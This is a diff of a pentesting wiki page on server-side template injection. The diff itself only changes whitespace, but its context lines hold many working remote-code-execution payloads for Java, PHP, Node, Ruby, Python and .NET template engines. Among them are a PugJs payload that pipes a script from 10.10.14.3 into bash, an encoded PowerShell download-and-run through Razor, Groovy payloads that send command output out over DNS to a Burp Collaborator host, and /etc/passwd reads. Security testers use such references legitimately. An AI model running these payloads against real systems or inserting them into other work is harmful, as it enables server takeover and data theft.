@@ -28,13 +28,13 @@ Detection
 To detect Server-Side Template Injection (SSTI), initially, **fuzzing the template** is a straightforward approach. This involves injecting a sequence of special characters (`**${{<%[%'"}}%\**`) into the template and analyzing the differences in the server's response to regular data versus this special payload. Vulnerability indicators include:
 
 - Thrown errors, revealing the vulnerability and potentially the template engine.
-    
+ 
 - Absence of the payload in the reflection, or parts of it missing, implying the server processes it differently than regular data.
-    
+ 
 - **Plaintext Context**: Distinguish from XSS by checking if the server evaluates template expressions (e.g., `{{7*7}}`, `${7*7}`).
-    
+ 
 - **Code Context**: Confirm vulnerability by altering input parameters. For instance, changing `greeting` in `http://vulnerable-website.com/?greeting=data.username` to see if the server's output is dynamic or fixed, like in `greeting=data.username}}hello` returning the username.
-    
+ 
 
 #### 
 
@@ -62,7 +62,7 @@ an efficient SSTI + CSTI scanner which utilizes novel polyglots
 
 ```
 tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
-tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
+tinja url -u "http://example.com/" -d "username=Kirlia" -c "PHPSESSID=ABC123..."
 ```
 
 ### 
@@ -116,9 +116,9 @@ Generic
 In this **wordlist** you can find **variables defined** in the environments of some of the engines mentioned below:
 
 - [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
-    
+ 
 - [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)
-    
+ 
 
 ### 
 
@@ -166,15 +166,15 @@ FreeMarker (Java)
 You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org/)
 
 - `{{7*7}} = {{7*7}}`
-    
+ 
 - `${7*7} = 49`
-    
+ 
 - `#{7*7} = 49 -- (legacy)`
-    
+ 
 - `${7*'7'} Nothing`
-    
+ 
 - `${foobar}`
-    
+ 
 
 
 
@@ -203,9 +203,9 @@ ${dwf.newInstance(ec,null)("id")}
 **More information**
 
 - In FreeMarker section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
-    
+ 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)
-    
+ 
 
 ### 
 
@@ -241,9 +241,9 @@ $out.read()
 **More information**
 
 - In Velocity section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
-    
+ 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)
-    
+ 
 
 ### 
 
@@ -254,21 +254,21 @@ Thymeleaf
 In Thymeleaf, a common test for SSTI vulnerabilities is the expression `${7*7}`, which also applies to this template engine. For potential remote code execution, expressions like the following can be used:
 
 - SpringEL:
-    
-   
-    
-    ```
-    ${T(java.lang.Runtime).getRuntime().exec('calc')}
-    ```
-    
+ 
+ 
+ 
+ ```
+ ${T(java.lang.Runtime).getRuntime().exec('calc')}
+ ```
+ 
 - OGNL:
-    
-   
-    
-    ```
-    ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
-    ```
-    
+ 
+ 
+ 
+ ```
+ ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
+ ```
+ 
 
 Thymeleaf requires these expressions to be placed within specific attributes. However, _expression inlining_ is supported for other template locations, using syntax like `[[...]]` or `[(...)]`. Thus, a simple SSTI test payload might look like `[[${7*7}]]`.
 
@@ -305,7 +305,7 @@ http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
 **More information**
 
 - [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
-    
+ 
 
 [EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)
 
@@ -326,7 +326,7 @@ Spring Framework (Java)
 Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
 - Read `/etc/passwd`
-    
+ 
 
 
 
@@ -335,7 +335,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```
 
 - Custom Script for payload generation
-    
+ 
 
 
 
@@ -355,14 +355,14 @@ end_payload = '.getInputStream())}'
 
 count = 1
 for i in converted:
-    if count == 1:
-        base_payload += f"(T(java.lang.Character).toString({i}).concat"
-        count += 1
-    elif count == len(converted):
-        base_payload += f"(T(java.lang.Character).toString({i})))"
-    else:
-        base_payload += f"(T(java.lang.Character).toString({i})).concat"
-        count += 1
+ if count == 1:
+ base_payload += f"(T(java.lang.Character).toString({i}).concat"
+ count += 1
+ elif count == len(converted):
+ base_payload += f"(T(java.lang.Character).toString({i})))"
+ else:
+ base_payload += f"(T(java.lang.Character).toString({i})).concat"
+ count += 1
 
 print(base_payload + end_payload)
 ```
@@ -370,9 +370,9 @@ print(base_payload + end_payload)
 **More Information**
 
 - [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
-    
+ 
 - [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)
-    
+ 
 
 ### 
 
@@ -388,7 +388,7 @@ __${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
 ```
 
 - [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)
-    
+ 
 
 [EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)
 
@@ -399,7 +399,7 @@ __${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
 Pebble (Java)
 
 - `{{ someString.toUPPERCASE() }}`
-    
+ 
 
 Old version of Pebble ( < version 3.0.9):
 
@@ -421,16 +421,16 @@ New version of Pebble :
 
 
 {% set bytes = (1).TYPE
-     .forName('java.lang.Runtime')
-     .methods[6]
-     .invoke(null,null)
-     .exec(cmd)
-     .inputStream
-     .readAllBytes() %}
+ .forName('java.lang.Runtime')
+ .methods[6]
+ .invoke(null,null)
+ .exec(cmd)
+ .inputStream
+ .readAllBytes() %}
 {{ (1).TYPE
-     .forName('java.lang.String')
-     .constructors[0]
-     .newInstance(([bytes]).toArray()) }}
+ .forName('java.lang.String')
+ .constructors[0]
+ .newInstance(([bytes]).toArray()) }}
 ```
 
 ### 
@@ -467,7 +467,7 @@ Fixed by [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpo
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)
-    
+ 
 
 ### 
 
@@ -476,23 +476,23 @@ Fixed by [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpo
 Hubspot - HuBL (Java)
 
 - `{% %}` statement delimiters
-    
+ 
 - `{{ }}` expression delimiters
-    
+ 
 - `{# #}` comment delimiters
-    
+ 
 - `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
-    
+ 
 - `{{'a'.toUpperCase()}}` - "A"
-    
+ 
 - `{{'a'.concat('b')}}` - "ab"
-    
+ 
 - `{{'a'.getClass()}}` - java.lang.String
-    
+ 
 - `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
-    
+ 
 - `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()
-    
+ 
 
 Search for "com.hubspot.content.hubl.context.TemplateContextRequest" and discovered the [Jinjava project on Github](https://github.com/HubSpot/jinjava/).
 
@@ -540,7 +540,7 @@ Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstanc
 **More information**
 
 - [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
-    
+ 
 
 ### 
 
@@ -549,24 +549,24 @@ Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstanc
 Expression Language - EL (Java)
 
 - `${"aaaa"}` - "aaaa"
-    
+ 
 - `${99999+1}` - 100000.
-    
+ 
 - `#{7*7}` - 49
-    
+ 
 - `${{7*7}}` - 49
-    
+ 
 - `${{request}}, ${{session}}, {{faceContext}}`
-    
+ 
 
 Expression Language (EL) is a fundamental feature that facilitates interaction between the presentation layer (like web pages) and the application logic (like managed beans) in JavaEE. It's used extensively across multiple JavaEE technologies to streamline this communication. The key JavaEE technologies utilizing EL include:
 
 - **JavaServer Faces (JSF)**: Employs EL to bind components in JSF pages to the corresponding backend data and actions.
-    
+ 
 - **JavaServer Pages (JSP)**: EL is used in JSP for accessing and manipulating data within JSP pages, making it easier to connect page elements to the application data.
-    
+ 
 - **Contexts and Dependency Injection for Java EE (CDI)**: EL integrates with CDI to allow seamless interaction between the web layer and managed beans, ensuring a more coherent application structure.
-    
+ 
 
 Check the following page to learn more about the **exploitation of EL interpreters**:
 
@@ -586,18 +586,18 @@ The following Security Manager bypasses were taken from this [**writeup**](https
 //Basic Payload
 import groovy.*;
 @groovy.transform.ASTTest(value={
-    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
-    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
+ cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
+ assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
 })
 def x
 
 //Payload to get output
 import groovy.*;
 @groovy.transform.ASTTest(value={
-    cmd = "whoami";
-    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
-    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
-    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
+ cmd = "whoami";
+ out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
+ cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
+ java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
 })
 def x
 
@@ -636,9 +636,9 @@ Smarty (PHP)
 **More information**
 
 - In Smarty section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
-    
+ 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)
-    
+ 
 
 ### 
 
@@ -647,15 +647,15 @@ Smarty (PHP)
 Twig (PHP)
 
 - `{{7*7}} = 49`
-    
+ 
 - `${7*7} = ${7*7}`
-    
+ 
 - `{{7*'7'}} = 49`
-    
+ 
 - `{{1/0}} = Error`
-    
+ 
 - `{{foobar}} Nothing`
-    
+ 
 
 
 
@@ -689,22 +689,22 @@ Twig (PHP)
 
 ```
 $output = $twig > render (
-  'Dear' . $_GET['custom_greeting'],
-  array("first_name" => $user.first_name)
+ 'Dear' . $_GET['custom_greeting'],
+ array("first_name" => $user.first_name)
 );
 
 $output = $twig > render (
-  "Dear {first_name}",
-  array("first_name" => $user.first_name)
+ "Dear {first_name}",
+ array("first_name" => $user.first_name)
 );
 ```
 
 **More information**
 
 - In Twig and Twig (Sandboxed) section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
-    
+ 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)
-    
+ 
 
 ### 
 
@@ -743,19 +743,19 @@ Layout template:
 
 ```
 <html>
-  <head>
-    <title><?=$this->e($title)?></title>
-  </head>
-  <body>
-    <?=$this->section('content')?>
-  </body>
+ <head>
+ <title><?=$this->e($title)?></title>
+ </head>
+ <body>
+ <?=$this->section('content')?>
+ </body>
 </html>
 ```
 
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)
-    
+ 
 
 ### 
 
@@ -773,20 +773,20 @@ PHPlib and HTML_Template_PHPLIB (PHP)
 <html>
  <head><title>{PAGE_TITLE}</title></head>
  <body>
-  <table>
-   <caption>Authors</caption>
-   <thead>
-    <tr><th>Name</th><th>Email</th></tr>
-   </thead>
-   <tfoot>
-    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
-   </tfoot>
-   <tbody>
+ <table>
+ <caption>Authors</caption>
+ <thead>
+ <tr><th>Name</th><th>Email</th></tr>
+ </thead>
+ <tfoot>
+ <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
+ </tfoot>
+ <tbody>
 <!-- BEGIN authorline -->
-    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
+ <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
 <!-- END authorline -->
-   </tbody>
-  </table>
+ </tbody>
+ </table>
  </body>
 </html>
 ```
@@ -799,8 +799,8 @@ PHPlib and HTML_Template_PHPLIB (PHP)
 <?php
 //we want to display this author list
 $authors = array(
-    'Christian Weiske'  => 'cweiske@php.net',
-    'Bjoern Schotte'     => 'schotte@mayflower.de'
+ 'Christian Weiske' => 'cweiske@php.net',
+ 'Bjoern Schotte' => 'schotte@mayflower.de'
 );
 
 require_once 'HTML/Template/PHPLIB.php';
@@ -817,9 +817,9 @@ $t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));
 
 //display the authors
 foreach ($authors as $name => $email) {
-    $t->setVar('AUTHOR_NAME', $name);
-    $t->setVar('AUTHOR_EMAIL', $email);
-    $t->parse('authorline_ref', 'authorline', true);
+ $t->setVar('AUTHOR_NAME', $name);
+ $t->setVar('AUTHOR_EMAIL', $email);
+ $t->parse('authorline_ref', 'authorline', true);
 }
 
 //finish and echo
@@ -830,7 +830,7 @@ echo $t->finish($t->parse('OUT', 'authors'));
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)
-    
+ 
 
 ### 
 
@@ -856,9 +856,9 @@ Jade (NodeJS)
 **More information**
 
 - In Jade section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
-    
+ 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)
-    
+ 
 
 ### 
 
@@ -872,20 +872,20 @@ patTemplate (PHP)
 
 ```
 <patTemplate:tmpl name="page">
-  This is the main page.
-  <patTemplate:tmpl name="foo">
-    It contains another template.
-  </patTemplate:tmpl>
-  <patTemplate:tmpl name="hello">
-    Hello {NAME}.<br/>
-  </patTemplate:tmpl>
+ This is the main page.
+ <patTemplate:tmpl name="foo">
+ It contains another template.
+ </patTemplate:tmpl>
+ <patTemplate:tmpl name="hello">
+ Hello {NAME}.<br/>
+ </patTemplate:tmpl>
 </patTemplate:tmpl>
 ```
 
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)
-    
+ 
 
 ### 
 
@@ -902,32 +902,32 @@ curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":
 ```
 
 - = Error
-    
+ 
 - ${7*7} = ${7*7}
-    
+ 
 - Nothing
-    
+ 
 
 
 ```
 {{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('whoami');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
+ {{#with "e"}}
+ {{#with split as |conslist|}}
+ {{this.pop}}
+ {{this.push (lookup string.sub "constructor")}}
+ {{this.pop}}
+ {{#with string.split as |codelist|}}
+ {{this.pop}}
+ {{this.push "return require('child_process').exec('whoami');"}}
+ {{this.pop}}
+ {{#each conslist}}
+ {{#with (string.sub.apply 0 codelist)}}
+ {{this}}
+ {{/with}}
+ {{/each}}
+ {{/with}}
+ {{/with}}
+ {{/with}}
 {{/with}}
 
 URLencoded:
@@ -937,7 +937,7 @@ URLencoded:
 **More information**
 
 - [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
-    
+ 
 
 ### 
 
@@ -945,7 +945,7 @@ URLencoded:
 
 JsRender (NodeJS)
 
-|   |   |
+| | |
 |---|---|
 |**Template**|**Description**|
 ||Evaluate and render output|
@@ -954,7 +954,7 @@ JsRender (NodeJS)
 |and|Allow code (disabled by default)|
 
 - = 49
-    
+ 
 
 **Client Side**
 
@@ -975,7 +975,7 @@ JsRender (NodeJS)
 **More information**
 
 - [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)
-    
+ 
 
 ### 
 
@@ -984,11 +984,11 @@ JsRender (NodeJS)
 PugJs (NodeJS)
 
 - `#{7*7} = 49`
-    
+ 
 - `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
-    
+ 
 - `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`
-    
+ 
 
 **Example server side render**
 
@@ -1002,7 +1002,7 @@ home = pugjs.render(injected_page)
 **More information**
 
 - [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)
-    
+ 
 
 ### 
 
@@ -1011,13 +1011,13 @@ home = pugjs.render(injected_page)
 NUNJUCKS (NodeJS)
 
 - {{7*7}} = 49
-    
+ 
 - {{foo}} = No output
-    
+ 
 - #{7*7} = #{7*7}
-    
+ 
 - {{console.log(1)}} = Error
-    
+ 
 
 
 
@@ -1029,7 +1029,7 @@ NUNJUCKS (NodeJS)
 **More information**
 
 - [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)
-    
+ 
 
 ### 
 
@@ -1038,13 +1038,13 @@ NUNJUCKS (NodeJS)
 ERB (Ruby)
 
 - `{{7*7}} = {{7*7}}`
-    
+ 
 - `${7*7} = ${7*7}`
-    
+ 
 - `<%= 7*7 %> = 49`
-    
+ 
 - `<%= foobar %> = Error`
-    
+ 
 
 
 
@@ -1055,7 +1055,7 @@ ERB (Ruby)
 
 <%= system('cat /etc/passwd') %>
 <%= `ls /` %>
-<%= IO.popen('ls /').readlines()  %>
+<%= IO.popen('ls /').readlines() %>
 <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
@@ -1063,7 +1063,7 @@ ERB (Ruby)
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)
-    
+ 
 
 ### 
 
@@ -1072,7 +1072,7 @@ ERB (Ruby)
 Slim (Ruby)
 
 - `{ 7 * 7 }`
-    
+ 
 
 
 
@@ -1083,7 +1083,7 @@ Slim (Ruby)
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)
-    
+ 
 
 ### 
 
@@ -1102,13 +1102,13 @@ Check out the following page to learn tricks about **arbitrary command execution
 Tornado (Python)
 
 - `{{7*7}} = 49`
-    
+ 
 - `${7*7} = ${7*7}`
-    
+ 
 - `{{foobar}} = Error`
-    
+ 
 - `{{7*'7'}} = 7777777`
-    
+ 
 
 
 
@@ -1130,7 +1130,7 @@ Tornado (Python)
 **More information**
 
 - [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)
-    
+ 
 
 ### 
 
@@ -1143,25 +1143,25 @@ Jinja2 (Python)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
 
 - `{{7*7}} = Error`
-    
+ 
 - `${7*7} = ${7*7}`
-    
+ 
 - `{{foobar}} Nothing`
-    
+ 
 - `{{4*4}}[[5*5]]`
-    
+ 
 - `{{7*'7'}} = 7777777`
-    
+ 
 - `{{config}}`
-    
+ 
 - `{{config.items()}}`
-    
+ 
 - `{{settings.SECRET_KEY}}`
-    
+ 
 - `{{settings}}`
-    
+ 
 - `<div data-gb-custom-block data-tag="debug"></div>`
-    
+ 
 
 
 
@@ -1185,11 +1185,11 @@ Jinja2 (Python)
 ```
 {% extends "layout.html" %}
 {% block body %}
-  <ul>
-  {% for user in users %}
-    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
-  {% endfor %}
-  </ul>
+ <ul>
+ {% for user in users %}
+ <li><a href="{{ user.url }}">{{ user.username }}</a></li>
+ {% endfor %}
+ </ul>
 {% endblock %}
 
 ```
@@ -1231,7 +1231,7 @@ ${x}
 **More information**
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)
-    
+ 
 
 ### 
 
@@ -1240,34 +1240,34 @@ ${x}
 Razor (.Net)
 
 - `@(2+2) <= Success`
-    
+ 
 - `@() <= Success`
-    
+ 
 - `@("{{code}}") <= Success`
-    
+ 
 - `@ <=Success`
-    
+ 
 - `@{} <= ERROR!`
-    
+ 
 - `@{ <= ERRROR!`
-    
+ 
 - `@(1+2)`
-    
+ 
 - `@( //C#Code )`
-    
+ 
 - `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
-    
+ 
 - `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`
-    
+ 
 
 The .NET `System.Diagnostics.Process.Start` method can be used to start any process on the server and thus create a webshell. You can find a vulnerable webapp example in [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)
 
 **More information**
 
 - [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
-    
+ 
 - [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)
-    
+ 
 
 # CTF
 
